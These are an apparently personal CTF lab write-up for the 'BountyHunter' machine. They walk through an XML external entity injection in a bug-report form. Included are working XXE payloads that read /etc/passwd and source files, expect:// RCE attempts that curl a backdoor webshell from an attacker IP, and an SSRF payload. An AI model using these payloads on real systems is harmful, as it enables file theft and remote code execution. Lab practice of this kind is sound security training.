# BountyHunter Notes

## Data 

IP: 
OS: [Ubuntu Focal](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.2)  
Hostname: 
Machine Purpose: 
Services: 22 - SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2, 80 - openfire
Service Languages:
Users:
Credentials:

## Objectives

## Target Map

## Solution Inventory Map


### Todo 

openfire version


### Done
      
- log_submit -> bountylog.js
	- xml enitity injection in bountylog.js -> tracker_diRbPr00f314 (db.php is not populated or added, but this file presents submitted data as a reflect html table)

- No login portal.php states log_submit
- Scripts is just Bootstrap

xml external entity injection

log_submit.php
```html
<html>
<head>
<script src="/resources/jquery.min.js"></script>
<script src="/resources/bountylog.js"></script>
</head>
<center>
<h1>Bounty Report System - Beta</h1>
<input type="text" id = "exploitTitle" name="exploitTitle" placeholder="Exploit Title">
<br>
<input type="text" id = "cwe" name="cwe" placeholder="CWE">
<br>
<input type="text" id = "cvss" name="exploitCVSS" placeholder="CVSS Score">
<br>
<input type="text" id = "reward" name="bountyReward" placeholder="Bounty Reward ($)">
<br>
<input type="submit" onclick = "bountySubmit()" value="Submit" name="submit">
<br>
<p id = "return"></p>
<center>
</html>
```

which passes data to bountylog.js
```js
function returnSecret(data) {
        return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
        try {
	                var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>${$('#exploitTitle').val()}</title>
                <cwe>${$('#cwe').val()}</cwe>
                <cvss>${$('#cvss').val()}</cvss>
                <reward>${$('#reward').val()}</reward>
                </bugreport>`
                let data = await returnSecret(btoa(xml));
                $("#return").html(data)
        }
        catch(error) {
                console.log('Error:', error);
        }
}
```

that send data to tracker_diRbPr00f314.php that returns back to log_submit.php as [.html()](https://www.w3schools.com/jquery/html_html.asp) to set content overwriting the contents of ALL matched elements
```html
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td></td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td></td>
  </tr>
  <tr>
    <td>Score:</td>
    <td></td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td></td>
  </tr>
</table>
```

This code POSTs our `data`  as JSON to tracker_diRbPr00f314.php, which if db.php were ready would display our data in a table. As that does not happen we need to control either the:
- title
- cwe
- cvss
- reward
forms which are evaluated by [jqeury val() method ](http://api.jquery.com/val/) that will *"Get the current value of the first element in the set of matched elements or set the value of every matched element."*

[btoa](https://developer.mozilla.org/en-US/docs/Web/API/btoa) *method creates a [Base64](https://developer.mozilla.org/en-US/docs/Glossary/Base64)-encoded ASCII string from a binary string (i.e., a string in which each character in the string is treated as a byte of binary data).* I cant stop thinking about [Senor JS Dev using promises](https://youtu.be/Uo3cL4nrGOk?t=86) then using callbacks. Thanks to the extensive time rewritting their code base *joke*, please watch the linked video we get our data reflected back

reflectedback.png


We can retrieve files with php wrappers
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=portal.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>&xxe;</cwe>
		<cvss>&xxe;</cvss>
		<reward>&xxe;</reward>
		</bugreport>
```

For here on I caught the request with proxy and used decoder instead of repeater: decoder  `base64 encode` paste into request ` url encode on caught request -> forward`

xxefileretrievealwithphpwrappers.png

retrievetheportaldotphpfileanddecoded.png

Before trying the flashy RCE with php `expect://`  SSRF from  [airman604](https://airman604.medium.com/from-xxe-to-rce-with-php-expect-the-missing-link-a18c265ea4c7). I tried the /etc/passwd for username then get ssh id_rsa

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>&xxe;</cwe>
		<cvss>&xxe;</cvss>
		<reward>&xxe;</reward>
		</bugreport>
```

For the development user
b64decodepasswd.png

But no id_rsa...


```xml
<!DOCTYPE root [  
  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:8000/backdoor.php'">  
]>
```
converting the above
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'10.10.14.106/monkey.php'">]>
		<bugreport>
		<title>&xxe</title>
		<cwe>0</cwe>
		<cvss>0</cvss>
		<reward>0</reward>
		</bugreport>
```
The above failed and trying the following all failed
```xml
RCE
<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://curl '10.10.14.106/monkey.php'">]>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://curl$IFS10.10.14.106/monkey.php">]>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://ls$IFS">]>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://ls">]>
SSRF
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://10.10.14.106/test">]>
```



I was not checking so one of my payload did work as we have 8 requests - 11 minutes ago..
Iamidiot.png
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://10.10.14.106/test">]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>&xxe;</cwe>
		<cvss>&xxe;</cvss>
		<reward>&xxe;</reward>
		</bugreport>
```

I still cant make expect work.
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "expect://pwd" >]>
```

Standup a webpage that forces download of a webshell

https://www.socketloop.com/tutorials/golang-force-download-file-example

https://gist.github.com/jmcarp/9291539, we require https://blog.logrocket.com/programmatic-file-downloads-in-the-browser-9a5186298d5c/
```js
function forceDownload(href) {
	var anchor = document.createElement('a');
	anchor.href = href;
	anchor.download = href;
	document.body.appendChild(anchor);
	anchor.click();
}
```


https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/#tools
https://airman604.medium.com/from-xxe-to-rce-with-php-expect-the-missing-link-a18c265ea4c7
https://infosecwriteups.com/xml-external-entity-xxe-injection-payload-list-937d33e5e116
https://portswigger.net/web-security/xxe